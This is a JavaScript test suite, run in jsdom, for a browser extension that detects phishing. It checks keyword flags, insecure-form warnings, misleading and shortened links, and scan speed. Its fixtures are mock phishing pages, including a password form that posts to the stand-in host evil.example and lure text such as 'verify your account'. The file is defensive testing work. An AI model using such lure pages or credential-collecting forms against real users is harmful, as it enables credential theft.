/**
 * Integration tests: content script (content.js) running inside jsdom.
 *
 * Covers positive/negative detection, the document_start (null body)
 * regression, misleading links, insecure forms and scan performance.
 */

const { describe, it } = require('node:test');
const assert = require('node:assert/strict');
const fs = require('node:fs');
const path = require('node:path');
const { JSDOM, VirtualConsole } = require('jsdom');

const ROOT = path.join(__dirname, '..', '..');
const detectorSrc = fs.readFileSync(path.join(ROOT, 'detector.js'), 'utf8');
const contentSrc = fs.readFileSync(path.join(ROOT, 'content.js'), 'utf8');

/** Build a jsdom page and run detector.js + content.js in it (after load). */
async function loadPage(html, url) {
  const dom = new JSDOM(html, {
    url,
    runScripts: 'outside-only',
    pretendToBeVisual: true
  });
  await new Promise((resolve) => {
    if (dom.window.document.readyState === 'complete') {
      resolve();
    } else {
      dom.window.addEventListener('load', () => resolve());
      setTimeout(resolve, 1000); // safety net
    }
  });
  dom.window.eval(detectorSrc);
  dom.window.eval(contentSrc);
  return dom;
}

function allElements(window) {
  return Array.from(window.document.querySelectorAll('*'));
}

describe('content script integration', () => {
  it('flags phishing keywords, insecure forms and misleading links (positive)', async () => {
    const dom = await loadPage(
      `<!DOCTYPE html><html><body>
        <h1>Security notice</h1>
        <p>We detected a suspended account. Please verify your account now.</p>
        <a href="https://evil.example/steal">Visit PayPal</a>
        <form action="http://evil.example/collect" method="post">
          <input type="password" name="pw">
        </form>
      </body></html>`,
      'http://suspect.example/login'
    );
    const w = dom.window;

    const flags = w.phishingFlags || [];
    assert.ok(
      flags.some((f) => f.includes('verify your account')),
      `missing keyword flag: ${JSON.stringify(flags)}`
    );
    assert.ok(flags.some((f) => f.includes('suspended account')));
    assert.ok(
      flags.some((f) => f.includes('Non-HTTPS site collecting sensitive information')),
      'http page with password field must be flagged'
    );

    // Form marked with shared stylesheet classes
    const form = w.document.querySelector('form');
    assert.ok(form.classList.contains('phishing-detector-suspicious'));
    assert.ok(form.classList.contains('phishing-detector-insecure-form'));

    // Misleading link marked
    const link = w.document.querySelector('a');
    assert.ok(link.classList.contains('phishing-detector-suspicious'));
    assert.ok(link.title.includes('Misleading link text'));

    dom.window.close();
  });

  it('does not flag a clean HTTPS page (negative)', async () => {
    const dom = await loadPage(
      `<!DOCTYPE html><html><body>
        <h1>Welcome</h1>
        <p>Read our latest articles about technology and design.</p>
        <a href="https://another.example/page">Related reading</a>
        <a href="https://paypal.com/">PayPal</a>
        <a href="https://github.com/user/repo">Source code</a>
        <p>Learn more at our <a href="https://en.wikipedia.org/wiki/Phishing">wiki</a>.</p>
      </body></html>`,
      'https://example.org/articles'
    );
    const w = dom.window;

    assert.ok(!w.phishingFlags || w.phishingFlags.length === 0,
      `unexpected flags: ${JSON.stringify(w.phishingFlags)}`);

    for (const el of allElements(w)) {
      assert.equal(
        el.classList.contains('phishing-detector-suspicious'),
        false,
        `element should not be marked: ${el.tagName} ${el.className}`
      );
    }

    dom.window.close();
  });

  it('does not flag keyword text that only appears in scripts/styles', async () => {
    const dom = await loadPage(
      `<!DOCTYPE html><html><head>
        <script>var msg = "verify your account";</script>
        <style>/* suspended account */ .x { color: red; }</style>
      </head><body><p>Hello world</p></body></html>`,
      'https://example.org/'
    );
    const w = dom.window;
    assert.ok(!w.phishingFlags || w.phishingFlags.length === 0,
      `script/style content must not be scanned: ${JSON.stringify(w.phishingFlags)}`);
    dom.window.close();
  });

  it('survives document_start injection (body still null) - regression test', async () => {
    // Reproduce manifest conditions: scripts run from <head> during parsing,
    // when document.body is null. The old implementation threw here.
    const virtualConsole = new VirtualConsole();
    const errors = [];
    virtualConsole.on('jsdomError', (err) => errors.push(err));

    const html =
      '<!DOCTYPE html><html><head>' +
      '<script>' + detectorSrc + '</script>' +
      '<script>' + contentSrc + '</script>' +
      '</head><body>' +
      '<p>Click here immediately to restore your suspended account.</p>' +
      '</body></html>';

    const dom = new JSDOM(html, {
      url: 'http://late.example/',
      runScripts: 'dangerously',
      virtualConsole,
      pretendToBeVisual: true
    });

    // No uncaught exception during head parsing
    assert.deepEqual(errors.map((e) => String(e && e.message)), []);

    // DOMContentLoaded handler must have been registered and fired
    await new Promise((r) => setTimeout(r, 50));
    const flags = dom.window.phishingFlags || [];
    assert.ok(
      flags.some((f) => f.includes('click here immediately')),
      `analysis should run after DOM ready: ${JSON.stringify(flags)}`
    );

    // Mutation observer must be active: dynamically added form gets analyzed
    const w = dom.window;
    const form = w.document.createElement('form');
    form.innerHTML = '<input type="password">';
    w.document.body.appendChild(form);
    await new Promise((r) => setTimeout(r, 300));
    assert.ok(
      form.dataset.pdMarked === '1' || form.classList.contains('phishing-detector-suspicious'),
      'dynamically added insecure form should be marked'
    );

    assert.deepEqual(errors.map((e) => String(e && e.message)), []);
    dom.window.close();
  });

  it('blocks insecure form submission when the user declines the confirm()', async () => {
    const dom = await loadPage(
      `<!DOCTYPE html><html><body>
        <form id="f" action="http://evil.example/collect">
          <input type="password" name="pw">
        </form>
      </body></html>`,
      'http://suspect.example/login'
    );
    const w = dom.window;

    let confirmCalls = 0;
    w.confirm = () => {
      confirmCalls += 1;
      return false; // user declines
    };

    const evt = new w.Event('submit', { bubbles: true, cancelable: true });
    w.document.getElementById('f').dispatchEvent(evt);

    assert.equal(confirmCalls, 1);
    assert.equal(evt.defaultPrevented, true, 'submission must be prevented');

    // User accepts -> submission proceeds
    w.confirm = () => true;
    const evt2 = new w.Event('submit', { bubbles: true, cancelable: true });
    w.document.getElementById('f').dispatchEvent(evt2);
    assert.equal(evt2.defaultPrevented, false);

    dom.window.close();
  });

  it('flags shortener links but not normal links', async () => {
    const dom = await loadPage(
      `<!DOCTYPE html><html><body>
        <a href="https://bit.ly/abc123">click</a>
        <a href="https://example.com/normal">normal</a>
      </body></html>`,
      'https://example.org/'
    );
    const w = dom.window;
    const [short, normal] = w.document.querySelectorAll('a');
    assert.ok(short.classList.contains('phishing-detector-suspicious'));
    assert.ok(!normal.classList.contains('phishing-detector-suspicious'));
    dom.window.close();
  });

  it('deduplicates flags and element marking across re-analysis', async () => {
    const dom = await loadPage(
      `<!DOCTYPE html><html><body>
        <p>verify your account</p>
        <a href="https://evil.example/">Visit Google</a>
      </body></html>`,
      'http://suspect.example/'
    );
    const w = dom.window;

    const keyword = 'Phishing keyword detected: "verify your account"';
    assert.equal(w.phishingFlags.filter((f) => f.includes(keyword)).length, 1);

    const link = w.document.querySelector('a');
    assert.equal(link.dataset.pdMarked, '1');

    // Simulate a full re-analysis (what the mutation observer triggers)
    w.eval('new PageAnalyzer();');

    assert.equal(
      w.phishingFlags.filter((f) => f.includes(keyword)).length,
      1,
      'flags must not duplicate on re-analysis'
    );
    assert.equal(link.dataset.pdMarked, '1');
    assert.equal(link.classList.contains('phishing-detector-suspicious'), true);

    dom.window.close();
  });

  it('scans a 1,000-element page in under 1.5 seconds', async () => {
    const paragraphs = Array.from(
      { length: 700 },
      (_, i) => `<p>Paragraph ${i} with some normal content and a link.</p>`
    ).join('');
    const links = Array.from(
      { length: 300 },
      (_, i) => `<a href="https://example.com/p/${i}">link ${i}</a>`
    ).join('');

    const start = performance.now();
    const dom = await loadPage(
      `<!DOCTYPE html><html><body>${paragraphs}${links}</body></html>`,
      'https://example.org/big'
    );
    const elapsed = performance.now() - start;

    assert.ok(!dom.window.phishingFlags || dom.window.phishingFlags.length === 0);
    assert.ok(elapsed < 1500, `full page analysis took ${elapsed.toFixed(0)}ms`);
    console.log(`    -> 1,000-element page analyzed in ${elapsed.toFixed(0)}ms`);
    dom.window.close();
  });
});
